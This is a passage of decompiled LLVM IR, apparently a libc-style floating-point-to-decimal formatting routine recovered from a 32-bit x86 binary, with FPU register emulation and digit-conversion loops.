  %v2_8051d83 = inttoptr i32 %v1_8051d83 to i32*
  %v3_8051d83 = load i32, i32* %v2_8051d83, align 4
  store i32 %v3_8051d83, i32* %eax.global-to-local, align 4
  %v2_8051d86 = and i32 %v3_8051d83, 2
  %v3_8051d86 = icmp eq i32 %v2_8051d86, 0
  br i1 %v3_8051d86, label %dec_label_pc_8051d94, label %dec_label_pc_8051da0

dec_label_pc_8051d94:                             ; preds = %dec_label_pc_8051d6a
  %v2_8051d94 = urem i32 %v3_8051d83, 2
  %tmp192 = trunc i32 %v2_8051d94 to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_8051da0

dec_label_pc_8051da0:                             ; preds = %dec_label_pc_8051d94, %dec_label_pc_8051d6a
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8051d6a ], [ %tmp193, %dec_label_pc_8051d94 ]
  %not.v5_8051da0 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_8051da0, label %dec_label_pc_8051e17, label %dec_label_pc_8051dc2

dec_label_pc_8051dc2:                             ; preds = %dec_label_pc_8051da0
  %v1_8051dc2 = add i3 %v4_8051d3c, -2
  store i3 %v1_8051dc2, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_8051dc6 = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_8051dc6, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_8051dc2
  br label %dec_label_pc_8051e52

bb180:                                            ; preds = %dec_label_pc_8051dc2
  %v5_8051dc6 = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_8051dc6, label %bb181, label %dec_label_pc_8051dca

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_8051e52

dec_label_pc_8051dca:                             ; preds = %bb180
  %not.v4_8051dc4 = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_8051dc4, label %dec_label_pc_8051e52, label %dec_label_pc_8051ee7

dec_label_pc_8051e17:                             ; preds = %dec_label_pc_8051da0
  store i3 %v4_8051d3c, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8051e1e = add i32 %tmp156, 16
  %v2_8051e1e = inttoptr i32 %v1_8051e1e to i32*
  store i32 32, i32* %v2_8051e1e, align 4
  %v4_8051e25 = add i8 %stack_var_-207.0, -96
  %v6_8051e25 = sub i8 95, %stack_var_-207.0
  %v7_8051e25 = and i8 %v6_8051e25, %stack_var_-207.0
  %v8_8051e25 = icmp slt i8 %v7_8051e25, 0
  %v9_8051e25 = icmp eq i8 %v4_8051e25, 0
  %v10_8051e25 = icmp slt i8 %v4_8051e25, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_8051e3a = icmp eq i1 %v10_8051e25, %v8_8051e25
  %v4_8051e3a = icmp eq i1 %v9_8051e25, false
  %v5_8051e3a = and i1 %v4_8051e3a, %v3_8051e3a
  br i1 %v5_8051e3a, label %dec_label_pc_8051e41, label %dec_label_pc_8051e3c

dec_label_pc_8051e3c:                             ; preds = %dec_label_pc_8051e17
  br label %dec_label_pc_8051e41

dec_label_pc_8051e41:                             ; preds = %dec_label_pc_8051e17, %dec_label_pc_8051e3c
  %v2_8051e49 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8051e49, i32* @ecx, align 4
  br label %dec_label_pc_8052212

dec_label_pc_8051e52:                             ; preds = %dec_label_pc_8051dca, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_8051e6c = xor i3 %v4_8051d3c, -4
  store i3 %v3_8051e6c, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8051e72

dec_label_pc_8051e72:                             ; preds = %dec_label_pc_8051ec3, %dec_label_pc_8051e52
  %v0_8051ec3 = phi i32 [ 4096, %dec_label_pc_8051e52 ], [ %v2_8051ec3, %dec_label_pc_8051ec3 ]
  %v2_8051e75 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8051e52 ], [ %v2_8051e7581, %dec_label_pc_8051ec3 ]
  %v1_8051ead = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8051e52 ], [ %v0_8051e7279, %dec_label_pc_8051ec3 ]
  %v0_8051ebf66 = phi i32 [ 13, %dec_label_pc_8051e52 ], [ %v1_8051e74, %dec_label_pc_8051ec3 ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_8051e52 ], [ %stack_var_-220.1, %dec_label_pc_8051ec3 ]
  %v1_8051e74 = add i32 %v0_8051ebf66, -1
  %v4_8051e75 = fcmp ule x86_fp80 %v1_8051ead, %v2_8051e75
  br i1 %v4_8051e75, label %dec_label_pc_8051e9c, label %dec_label_pc_8051e79

dec_label_pc_8051e79:                             ; preds = %dec_label_pc_8051e72
  store x86_fp80 %v1_8051ead, x86_fp80* %st0.global-to-local, align 4
  %v3_8051e7b = mul i32 %v1_8051e74, 12
  store i32 %v3_8051e7b, i32* %eax.global-to-local, align 4
  %v1_8051e7e = add i32 %v3_8051e7b, ptrtoint (x86_fp80** @global_var_8054540.168 to i32)
  %v2_8051e7e = inttoptr i32 %v1_8051e7e to x86_fp80*
  %v3_8051e7e = load x86_fp80, x86_fp80* %v2_8051e7e, align 4
  %v4_8051e84 = fmul x86_fp80 %v1_8051ead, %v3_8051e7e
  store x86_fp80 %v4_8051e84, x86_fp80* %st1.global-to-local, align 4
  %v4_8051e88 = fcmp ule x86_fp80 %v4_8051e84, %v3_8051e7e
  br i1 %v4_8051e88, label %dec_label_pc_8051ebd, label %dec_label_pc_8051e8c

dec_label_pc_8051e8c:                             ; preds = %dec_label_pc_8051e79
  store x86_fp80 %v4_8051e84, x86_fp80* %st1.global-to-local, align 4
  %v5_8051e96 = sub i32 %stack_var_-220.0, %v0_8051ec3
  br label %dec_label_pc_8051ebf

dec_label_pc_8051e9c:                             ; preds = %dec_label_pc_8051e72
  %v3_8051e9c = mul i32 %v1_8051e74, 12
  store i32 %v3_8051e9c, i32* %eax.global-to-local, align 4
  %v1_8051e9f = add i32 %v3_8051e9c, ptrtoint (x86_fp80** @global_var_8054540.168 to i32)
  %v2_8051e9f = inttoptr i32 %v1_8051e9f to x86_fp80*
  %v3_8051e9f = load x86_fp80, x86_fp80* %v2_8051e9f, align 4
  %v4_8051ea5 = fdiv x86_fp80 %v3_8051e9f, %v1_8051ead
  store x86_fp80 %v4_8051ea5, x86_fp80* %st1.global-to-local, align 4
  %v4_8051ea7 = fcmp ogt x86_fp80 %v3_8051e9f, %v1_8051ead
  br i1 %v4_8051ea7, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_8051e9c
  store x86_fp80 %v3_8051e9f, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8051ead

bb183:                                            ; preds = %dec_label_pc_8051e9c
  %v5_8051ea7 = fcmp olt x86_fp80 %v3_8051e9f, %v1_8051ead
  br i1 %v5_8051ea7, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_8051e9f, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8051ebd

bb184:                                            ; preds = %bb183
  %not.v6_8051ea7 = fcmp une x86_fp80 %v3_8051e9f, %v1_8051ead
  store x86_fp80 %v3_8051e9f, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_8051ea7, label %dec_label_pc_8051ebd, label %dec_label_pc_8051ead

dec_label_pc_8051ead:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_8051e9f, x86_fp80* %st1.global-to-local, align 4
  %v5_8051eb7 = add i32 %stack_var_-220.0, %v0_8051ec3
  br label %dec_label_pc_8051ebf

dec_label_pc_8051ebd:                             ; preds = %dec_label_pc_8051e79, %.thread51, %bb184
  %v1_8051ebd = phi x86_fp80 [ %v1_8051ead, %.thread51 ], [ %v1_8051ead, %bb184 ], [ %v3_8051e7e, %dec_label_pc_8051e79 ]
  %v0_8051e7280 = phi x86_fp80 [ %v3_8051e9f, %.thread51 ], [ %v3_8051e9f, %bb184 ], [ %v4_8051e84, %dec_label_pc_8051e79 ]
  store x86_fp80 %v1_8051ebd, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8051ebf

dec_label_pc_8051ebf:                             ; preds = %dec_label_pc_8051ead, %dec_label_pc_8051e8c, %dec_label_pc_8051ebd
  %v2_8051e7581 = phi x86_fp80 [ %v1_8051ebd, %dec_label_pc_8051ebd ], [ %v2_8051e75, %dec_label_pc_8051ead ], [ %v1_8051ead, %dec_label_pc_8051e8c ]
  %v0_8051e7279 = phi x86_fp80 [ %v0_8051e7280, %dec_label_pc_8051ebd ], [ %v3_8051e9f, %dec_label_pc_8051ead ], [ %v4_8051e84, %dec_label_pc_8051e8c ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_8051ebd ], [ %v5_8051eb7, %dec_label_pc_8051ead ], [ %v5_8051e96, %dec_label_pc_8051e8c ]
  %v1_8051ebf = icmp eq i32 %v1_8051e74, 0
  br i1 %v1_8051ebf, label %.thread60, label %dec_label_pc_8051ec3

dec_label_pc_8051ec3:                             ; preds = %dec_label_pc_8051ebf
  %v2_8051ec3 = sdiv i32 %v0_8051ec3, 2
  store i32 %v2_8051ec3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051e72

.thread60:                                        ; preds = %dec_label_pc_8051ebf
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8051ee7

dec_label_pc_8051ee7:                             ; preds = %dec_label_pc_8051dca, %.thread60
  %v0_8051fa1 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_8051dca ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_8051dca ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_8051eeb = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8051dc2, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8051efe = and i32 %v2_8051eeb, -65536
  %v1_8051f03 = udiv i16 %tmp146, 256
  %v2_8051f03 = zext i16 %v1_8051f03 to i32
  %v3_8051f03 = or i32 %v2_8051f03, 12
  %v10_8051f03 = mul nuw nsw i32 %v3_8051f03, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_8051efe.masked = zext i16 %tmp194 to i32
  %v11_8051f03 = or i32 %v10_8051f03, %v4_8051efe.masked
  %v12_8051f03 = or i32 %v11_8051f03, %v6_8051efe
  store i32 %v12_8051f03, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f0b

dec_label_pc_8051f0b:                             ; preds = %dec_label_pc_8051f5d.dec_label_pc_8051f0b_crit_edge, %dec_label_pc_8051ee7
  %v2_8051f30 = phi x86_fp80 [ %storemerge, %dec_label_pc_8051ee7 ], [ %v2_8051f30.pre, %dec_label_pc_8051f5d.dec_label_pc_8051f0b_crit_edge ]
  %v1_8051f0b = phi i3 [ %v1_8051dc2, %dec_label_pc_8051ee7 ], [ %v1_8051f0b.pre, %dec_label_pc_8051f5d.dec_label_pc_8051f0b_crit_edge ]
  %v3_8051f32 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8051ee7 ], [ %v0_8051f0b.pre, %dec_label_pc_8051f5d.dec_label_pc_8051f0b_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8051eeb, %dec_label_pc_8051ee7 ], [ %v4_8051f2b, %dec_label_pc_8051f5d.dec_label_pc_8051f0b_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_8051f32 to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_8051f25 = sitofp i32 %tmp195 to x86_fp80
  %v4_8051f2b = add i32 %stack_var_-212.0, 9
  %v4_8051f30 = fsub x86_fp80 %v2_8051f30, %v5_8051f25
  store i3 %v1_8051f0b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8051f32 = fmul x86_fp80 %v3_8051f32, %v4_8051f30
  store x86_fp80 %v4_8051f32, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8051f34

dec_label_pc_8051f34:                             ; preds = %dec_label_pc_8051f34.dec_label_pc_8051f34_crit_edge, %dec_label_pc_8051f0b
  %v0_8051f48 = phi i32 [ %v0_8051f48.pre, %dec_label_pc_8051f34.dec_label_pc_8051f34_crit_edge ], [ %tmp195, %dec_label_pc_8051f0b ]
  %v0_8051f38 = phi i32 [ %v0_8051f38.pre, %dec_label_pc_8051f34.dec_label_pc_8051f34_crit_edge ], [ 0, %dec_label_pc_8051f0b ]
  %v1_8051f38 = add i32 %v0_8051f38, 1
  store i32 %v1_8051f38, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_8051f42 = sub i32 %v4_8051f2b, %v1_8051f38
  %div = udiv i32 %v0_8051f48, 10
  %tmp185 = urem i32 %v0_8051f48, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_8051f4e = and i32 %div, 536870656
  store i32 %v2_8051f42, i32* %edx.global-to-local, align 4
  %v1_8051f54 = trunc i32 %tmp185 to i8
  %v2_8051f54 = or i8 %v1_8051f54, 48
  %v12_8051f54 = zext i8 %v2_8051f54 to i32
  %v15_8051f54 = or i32 %v12_8051f54, %v3_8051f4e
  store i32 %v15_8051f54, i32* %eax.global-to-local, align 4
  %v3_8051f59 = inttoptr i32 %v2_8051f42 to i8*
  store i8 %v2_8051f54, i8* %v3_8051f59, align 1
  %v7_8051f5b = icmp sgt i32 %v1_8051f38, 8
  br i1 %v7_8051f5b, label %dec_label_pc_8051f5d, label %dec_label_pc_8051f34.dec_label_pc_8051f34_crit_edge

dec_label_pc_8051f34.dec_label_pc_8051f34_crit_edge: ; preds = %dec_label_pc_8051f34
  %v0_8051f38.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8051f48.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051f34

dec_label_pc_8051f5d:                             ; preds = %dec_label_pc_8051f34
  %v0_8051f5d = load i32, i32* @edi, align 4
  %v1_8051f5d = add i32 %v0_8051f5d, 1
  store i32 %v1_8051f5d, i32* @edi, align 4
  %v7_8051f61 = icmp sgt i32 %v1_8051f5d, 2
  br i1 %v7_8051f61, label %dec_label_pc_8051f63, label %dec_label_pc_8051f5d.dec_label_pc_8051f0b_crit_edge

dec_label_pc_8051f5d.dec_label_pc_8051f0b_crit_edge: ; preds = %dec_label_pc_8051f5d
  %v0_8051f0b.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8051f0b.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8051f30.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8051f0b

dec_label_pc_8051f63:                             ; preds = %dec_label_pc_8051f5d
  %v0_8051f63 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8051f63 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8051f63, x86_fp80* %st0.global-to-local, align 4
  %v2_8051f65 = add i3 %v0_8051f63, 2
  store i3 %v2_8051f65, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8051f67 = add i8 %stack_var_-207.0, -96
  %v6_8051f67 = sub i8 95, %stack_var_-207.0
  %v7_8051f67 = and i8 %v6_8051f67, %stack_var_-207.0
  %v8_8051f67 = icmp slt i8 %v7_8051f67, 0
  %v9_8051f67 = icmp eq i8 %v4_8051f67, 0
  %v10_8051f67 = icmp slt i8 %v4_8051f67, 0
  %v3_8051f6c = icmp eq i1 %v10_8051f67, %v8_8051f67
  %v4_8051f6c = icmp eq i1 %v9_8051f67, false
  %v5_8051f6c = and i1 %v4_8051f6c, %v3_8051f6c
  br i1 %v5_8051f6c, label %dec_label_pc_8051f7b, label %dec_label_pc_8051f6e

dec_label_pc_8051f6e:                             ; preds = %dec_label_pc_8051f63
  %v4_8051f6e = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_8051f7b

dec_label_pc_8051f7b:                             ; preds = %dec_label_pc_8051f63, %dec_label_pc_8051f6e
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_8051f63 ], [ %v4_8051f6e, %dec_label_pc_8051f6e ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8051f63 ], [ 69, %dec_label_pc_8051f6e ]
  %v12_8051f7b = icmp eq i8 %stack_var_-207.1, 103
  %v1_8051f80 = icmp eq i1 %v12_8051f7b, false
  br i1 %v1_8051f80, label %dec_label_pc_8051f89, label %dec_label_pc_8051f82

dec_label_pc_8051f82:                             ; preds = %dec_label_pc_8051f7b
  %v0_8051f82 = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_8051f82, 1
  br i1 %tmp186, label %dec_label_pc_8051f90, label %dec_label_pc_8051f86

dec_label_pc_8051f86:                             ; preds = %dec_label_pc_8051f82
  %v1_8051f86 = add i32 %v0_8051f82, -1
  store i32 %v1_8051f86, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051f90

dec_label_pc_8051f89:                             ; preds = %dec_label_pc_8051f7b
  %v12_8051f89 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_8051f89, label %dec_label_pc_8051f94, label %dec_label_pc_8051f89.dec_label_pc_8051f90_crit_edge

dec_label_pc_8051f89.dec_label_pc_8051f90_crit_edge: ; preds = %dec_label_pc_8051f89
  %v0_8051f90.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051f90

dec_label_pc_8051f90:                             ; preds = %dec_label_pc_8051f89.dec_label_pc_8051f90_crit_edge, %dec_label_pc_8051f82, %dec_label_pc_8051f86
  %v0_8051f90 = phi i32 [ %v0_8051f90.pre, %dec_label_pc_8051f89.dec_label_pc_8051f90_crit_edge ], [ %v0_8051f82, %dec_label_pc_8051f82 ], [ %v1_8051f86, %dec_label_pc_8051f86 ]
  store i32 %v0_8051f90, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051fc1

dec_label_pc_8051f94:                             ; preds = %dec_label_pc_8051f89
  store i32 %v0_8051fa1, i32* %eax.global-to-local, align 4
  %v0_8051f98 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051f98 = add i32 %v0_8051f98, %v0_8051fa1
  store i32 %v2_8051f98, i32* %ebx.global-to-local, align 4
  %v5_8051f9f = icmp slt i32 %v2_8051f98, -1
  br i1 %v5_8051f9f, label %dec_label_pc_8051fa1, label %dec_label_pc_8051fc1

dec_label_pc_8051fa1:                             ; preds = %dec_label_pc_8051f94
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051fa9 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8051fa9, i32* %eax.global-to-local, align 4
  %v4_8051fb1 = bitcast i32* %stack_var_-72 to i8*
  %v5_8051fb1 = call i32 @__GI_memset(i8* %v4_8051fb1, i32 48, i32 21)
  store i32 %v5_8051fb1, i32* %eax.global-to-local, align 4
  %v0_8051fc1.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051fc1

dec_label_pc_8051fc1:                             ; preds = %dec_label_pc_8051f94, %dec_label_pc_8051fa1, %dec_label_pc_8051f90
  %v1_8051fe1 = phi i32 [ %v0_8051f90, %dec_label_pc_8051f90 ], [ %v2_8051f98, %dec_label_pc_8051f94 ], [ %v0_8051fc1.pr.pre, %dec_label_pc_8051fa1 ]
  %stack_var_-220.3 = phi i32 [ %v0_8051fa1, %dec_label_pc_8051f90 ], [ %v0_8051fa1, %dec_label_pc_8051f94 ], [ -1, %dec_label_pc_8051fa1 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8051fd4 = icmp sgt i32 %v1_8051fe1, 20
  br i1 %v7_8051fd4, label %dec_label_pc_8051fd6, label %dec_label_pc_8051fe1

dec_label_pc_8051fd6:                             ; preds = %dec_label_pc_8051fc1
  %v2_8051fd6 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8051fd6, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051ff5.preheader

dec_label_pc_8051fe1:                             ; preds = %dec_label_pc_8051fc1
  %v0_8051fe1 = load i32, i32* @esp, align 4
  %v2_8051fe1 = add i32 %v1_8051fe1, 165
  %v3_8051fe1 = add i32 %v2_8051fe1, %v0_8051fe1
  store i32 %v3_8051fe1, i32* %eax.global-to-local, align 4
  %v1_8051fe8 = add i32 %v3_8051fe1, 2
  %v2_8051fe8 = inttoptr i32 %v1_8051fe8 to i8*
  %v3_8051fe8 = load i8, i8* %v2_8051fe8, align 1
  %v4_8051fe8 = add i8 %v3_8051fe8, -53
  %v9_8051fe8 = sub i8 52, %v3_8051fe8
  %v10_8051fe8 = and i8 %v9_8051fe8, %v3_8051fe8
  %v11_8051fe8 = icmp slt i8 %v10_8051fe8, 0
  %v13_8051fe8 = icmp slt i8 %v4_8051fe8, 0
  store i32 %v1_8051fe8, i32* %ecx.global-to-local, align 4
  %v2_8051fef = icmp eq i1 %v13_8051fe8, %v11_8051fe8
  %v3_8051fef = zext i1 %v2_8051fef to i32
  br label %dec_label_pc_8051ff5.preheader

dec_label_pc_8051ff5.preheader:                   ; preds = %dec_label_pc_8051fe1, %dec_label_pc_8051fd6
  %v0_8051ff5102 = phi i32 [ %v1_8051fe8, %dec_label_pc_8051fe1 ], [ %v2_8051fd6, %dec_label_pc_8051fd6 ]
  %storemerge71 = phi i32 [ %v3_8051fef, %dec_label_pc_8051fe1 ], [ 0, %dec_label_pc_8051fd6 ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ff5

dec_label_pc_8051ff5:                             ; preds = %dec_label_pc_8051ff5.backedge, %dec_label_pc_8051ff5.preheader
  %v3_8051ff6 = phi i32 [ %v3_8051ff6.pre, %dec_label_pc_8051ff5.backedge ], [ %storemerge71, %dec_label_pc_8051ff5.preheader ]
  %v0_8051ff5 = phi i32 [ %v0_8051ff8, %dec_label_pc_8051ff5.backedge ], [ %v0_8051ff5102, %dec_label_pc_8051ff5.preheader ]
  %v1_8051ff5 = add i32 %v0_8051ff5, -1
  store i32 %v1_8051ff5, i32* %ecx.global-to-local, align 4
  %v1_8051ff6 = inttoptr i32 %v1_8051ff5 to i8*
  %v2_8051ff6 = load i8, i8* %v1_8051ff6, align 1
  %v4_8051ff6 = trunc i32 %v3_8051ff6 to i8
  %v5_8051ff6 = add i8 %v2_8051ff6, %v4_8051ff6
  store i8 %v5_8051ff6, i8* %v1_8051ff6, align 1
  %v0_8051ff8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051ff8 = inttoptr i32 %v0_8051ff8 to i8*
  %v2_8051ff8 = load i8, i8* %v1_8051ff8, align 1
  %v3_8051ff8 = zext i8 %v2_8051ff8 to i32
  %v4_8051ff8 = load i32, i32* %edx.global-to-local, align 4
  %v5_8051ff8 = and i32 %v4_8051ff8, -256
  %v6_8051ff8 = or i32 %v5_8051ff8, %v3_8051ff8
  store i32 %v6_8051ff8, i32* %edx.global-to-local, align 4
  %v7_8051ffa = icmp eq i8 %v2_8051ff8, 48
  br i1 %v7_8051ffa, label %dec_label_pc_8051ff5.backedge, label %dec_label_pc_8051fff

dec_label_pc_8051ff5.backedge:                    ; preds = %dec_label_pc_8051ff5, %dec_label_pc_8051fff
  %v3_8051ff6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ff5

dec_label_pc_8051fff:                             ; preds = %dec_label_pc_8051ff5
  %v2_8051fff = add i8 %v2_8051ff8, -57
  %v7_8051fff = sub i8 56, %v2_8051ff8
  %v8_8051fff = and i8 %v7_8051fff, %v2_8051ff8
  %v9_8051fff = icmp slt i8 %v8_8051fff, 0
  %v10_8051fff = icmp eq i8 %v2_8051fff, 0
  %v11_8051fff = icmp slt i8 %v2_8051fff, 0
  %v3_8052002 = icmp eq i1 %v11_8051fff, %v9_8051fff
  %v4_8052002 = icmp eq i1 %v10_8051fff, false
  %v5_8052002 = and i1 %v4_8052002, %v3_8052002
  br i1 %v5_8052002, label %dec_label_pc_8051ff5.backedge, label %dec_label_pc_8052004

dec_label_pc_8052004:                             ; preds = %dec_label_pc_8051fff
  %v2_8052004 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8052004, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_8051ff8, %v2_8052004
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_805200f, label %dec_label_pc_805201c

dec_label_pc_805200f:                             ; preds = %dec_label_pc_8052004
  store i32 %v2_8051eeb, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052025

dec_label_pc_805201c:                             ; preds = %dec_label_pc_8052004
  store i32 %v2_8052004, i32* %edx.global-to-local, align 4
  store i32 %v2_8052004, i32* %ecx.global-to-local, align 4
  %v1_8052024 = add i32 %stack_var_-220.3, 1
  store i32 %v1_8052024, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052025

dec_label_pc_8052025:                             ; preds = %dec_label_pc_805200f, %dec_label_pc_805201c
  %v0_8052025 = phi i32 [ %v0_8051ff8, %dec_label_pc_805200f ], [ %v2_8052004, %dec_label_pc_805201c ]
  %v1_8052025 = add i32 %v0_8052025, 1
  store i32 %v1_8052025, i32* %eax.global-to-local, align 4
  %v2_805202c = inttoptr i32 %v1_8052025 to i8*
  store i8 0, i8* %v2_805202c, align 1
  br i1 %v1_8051f80, label %dec_label_pc_8052052, label %dec_label_pc_8052037

dec_label_pc_8052037:                             ; preds = %dec_label_pc_8052025
  %v0_8052037 = load i32, i32* %esi.global-to-local, align 4
  %v5_805203a = icmp slt i32 %v0_8052037, -4
  br i1 %v5_805203a, label %dec_label_pc_805205f, label %dec_label_pc_805203c

dec_label_pc_805203c:                             ; preds = %dec_label_pc_8052037
  %v1_805203c = load i32, i32* %ebx.global-to-local, align 4
  %v7_805203e = icmp slt i32 %v1_805203c, %v0_8052037
  br i1 %v7_805203e, label %dec_label_pc_805205f, label %dec_label_pc_8052047

dec_label_pc_8052047:                             ; preds = %dec_label_pc_805203c
  %v2_8052049 = sub i32 %v1_805203c, %v0_8052037
  store i32 %v2_8052049, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052063

dec_label_pc_8052052:                             ; preds = %dec_label_pc_8052025
  %v4_8052052 = zext i8 %stack_var_-207.1 to i32
  %v5_8052052 = load i32, i32* %ebx.global-to-local, align 4
  %v6_8052052 = and i32 %v5_8052052, -256
  %v7_8052052 = or i32 %v6_8052052, %v4_8052052
  store i32 %v7_8052052, i32* %ebx.global-to-local, align 4
  %v10_8052056 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_8052056, label %dec_label_pc_8052052.dec_label_pc_8052063_crit_edge, label %dec_label_pc_805205f

dec_label_pc_8052052.dec_label_pc_8052063_crit_edge: ; preds = %dec_label_pc_8052052
  %v0_8052063.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052063

dec_label_pc_805205f:                             ; preds = %dec_label_pc_8052037, %dec_label_pc_805203c, %dec_label_pc_8052052
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8052052 ], [ 103, %dec_label_pc_805203c ], [ 103, %dec_label_pc_8052037 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805206d

dec_label_pc_8052063:                             ; preds = %dec_label_pc_8052052.dec_label_pc_8052063_crit_edge, %dec_label_pc_8052047
  %v0_8052065 = phi i32 [ %v0_8052063.pre, %dec_label_pc_8052052.dec_label_pc_8052063_crit_edge ], [ %v0_8052037, %dec_label_pc_8052047 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8052052.dec_label_pc_8052063_crit_edge ], [ 102, %dec_label_pc_8052047 ]
  %v2_8052063 = icmp slt i32 %v0_8052065, 0
  store i32 %v0_8052065, i32* %ebx.global-to-local, align 4
  %v1_8052067 = icmp eq i1 %v2_8052063, false
  br i1 %v1_8052067, label %dec_label_pc_805206d, label %dec_label_pc_8052069

dec_label_pc_8052069:                             ; preds = %dec_label_pc_8052063
  %v0_8052069 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052069 = add i32 %v0_8052069, -1
  store i32 %v1_8052069, i32* %edx.global-to-local, align 4
  %v1_805206a = inttoptr i32 %v1_8052069 to i8*
  store i8 48, i8* %v1_805206a, align 1
  %v0_80520a2.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805206d

dec_label_pc_805206d:                             ; preds = %dec_label_pc_8052063, %dec_label_pc_805205f, %dec_label_pc_8052069
